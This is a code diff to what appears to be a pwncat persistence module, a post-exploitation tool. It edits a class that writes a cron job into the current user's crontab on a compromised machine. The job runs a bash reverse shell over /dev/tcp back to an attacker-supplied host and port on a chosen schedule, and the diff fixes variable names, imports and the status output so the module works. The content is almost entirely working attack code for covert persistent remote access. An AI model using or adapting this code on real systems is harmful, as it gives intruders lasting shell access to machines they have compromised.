@@ -1,7 +1,7 @@
 import os, pwncat, random
 from crontab import CronTab
 #from cron_descriptor import get_description, ExpressionDescriptor
-from pwncat.persist import Argument, Status, PersistType, PersistError
+from pwncat.modules import Argument, Status, PersistType, PersistError
 from pwncat.modules.persist import PersistModule
 #from pwncat import util
 #from pwncat.persist import PersistenceMethod, PersistenceError
@@ -9,11 +9,12 @@ from pwncat.modules.persist import PersistModule
 #import pwncat
 
 class Module(PersistModule):
-    TYPE = PersistType.LOCAL
+    """ Install a reverse shell (executed by /bin/bash) in the current user's crontab """
+    TYPE = PersistType.REMOTE
     ARGUMENTS = {
             **PersistModule.ARGUMENTS,
             "lhost": Argument(
-                str, defualt=pwncat.victim.host.ip, help="The host to call back to"
+                str, help="The host to call back to"
                 ),
             "lport": Argument(
                 int, default=4444, help="The port to call back to"
@@ -30,6 +31,7 @@ class Module(PersistModule):
     def install(self, user, lhost, lport, schedule, shell):
         if shell == "current":
             shell = pwncat.victim.shell  
+        
         try:
             randint = random.randint(1024, 65535)
             cron = CronTab(user=True)
@@ -38,11 +40,13 @@ class Module(PersistModule):
             cron.write()
         except (PermissionError) as exc:
             raise PersistError(str(exc))
+        
         cron.remove(job)
         cron.write()
+        
         if schedule != "" and lhost != "" and lport != "":
-            cron = crontab.CronTab(user=True)
-            payload = str("bash -c 'bash -i > /dev/tcp/" + rhost.strip() + "/" + rport.strip() + " 2>&1'")
+            cron = CronTab(user=True)
+            payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 2>&1'")
             job = cron.new(command=payload)
             c = 0
             for number in schedule.split():
@@ -59,7 +63,10 @@ class Module(PersistModule):
                         job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
                     c += 1
                     # if number = * then do not set, the crontab module assumes that as default
-                cron.write()
+            cron.write()
+            yield Status("Installed the following cron: " + str(schedule) + str(payload))
+
+
 '''
 
     #system = False
